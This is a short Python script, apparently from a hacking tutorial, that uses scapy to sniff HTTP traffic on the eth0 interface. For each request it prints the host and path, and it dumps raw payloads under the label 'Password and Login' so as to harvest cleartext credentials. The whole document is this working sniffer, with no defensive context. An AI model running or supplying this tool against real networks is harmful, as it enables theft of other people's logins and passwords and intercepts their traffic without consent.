import scapy.all as scapy
from scapy.layers import http

#COLOR
green = "\033[32m"
yellow = "\033[33m"

def sniff(interface):
    scapy.sniff(iface=interface, store=False, prn=process_sniffe_packet)

def get_url(packet):
    return packet[http.HTTPRequest].Host + packet[http.HTTPRequest].Path
def process_sniffe_packet(packet):
    if packet.haslayer(http.HTTPRequest):
        url = get_url(packet)
        print(f"\033[33m[+] HTTP Request >> {str(url)}")
        if packet.haslayer(scapy.Raw):
            print(f"\033[32m[+] Password and Login  >> {packet[scapy.Raw].load}")

sniff("eth0")